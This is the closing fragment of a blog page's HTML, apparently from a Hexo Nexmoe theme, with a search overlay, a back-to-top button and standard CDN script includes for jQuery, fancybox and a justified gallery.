                      <a href="#nexmoe-content" class="toc-link" aria-label="回到顶部" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
                  </div>
              </div>
            </div>
        </div>
    </div>
     
    <div id="nexmoe-search-space">
        <div class="search-container">
            <div class="search-header">
                <div class="search-input-container">
                    <input class="search-input" type="text" placeholder="搜索" oninput="sinput();">
                </div>
                <a class="search-close" onclick="sclose();">×</a>
            </div>
            <div class="search-body"></div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/combine/npm/lazysizes@5.1.0/lazysizes.min.js,npm/mdui@0.4.3/dist/js/mdui.min.js?v=1"></script>
<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>

 

<script async src="/js/app.js?v=1632155308715"></script>



<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js"></script>
<script>
	$(".justified-gallery").justifiedGallery({
		rowHeight: 160,
		margins: 10,
	});
</script>


    





</body>

</html>
